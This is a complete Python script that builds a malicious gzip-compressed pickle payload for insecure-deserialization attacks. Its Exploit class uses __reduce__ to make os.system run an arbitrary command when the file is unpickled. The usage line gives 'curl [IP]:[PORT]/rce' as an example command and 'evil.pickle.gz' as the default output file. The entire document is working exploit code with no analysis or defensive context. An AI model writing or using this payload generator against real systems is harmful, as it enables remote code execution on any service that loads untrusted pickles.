#!/usr/bin/env python3
import pickle, gzip, os, sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <command> [output]")
    print(f"  Ex:  {sys.argv[0]} 'curl [IP]:[PORT]/rce' evil.pickle.gz")
    sys.exit(1)

cmd = sys.argv[1]
outfile = sys.argv[2] if len(sys.argv) > 2 else "evil.pickle.gz"

class Exploit:
    def __reduce__(self):
        return (os.system, (cmd,))

with gzip.open(outfile, 'wb') as f:
    f.write(pickle.dumps(Exploit()))

print(f"[+] {outfile} ({os.path.getsize(outfile)} bytes)")
print(f"    cmd: {cmd}")
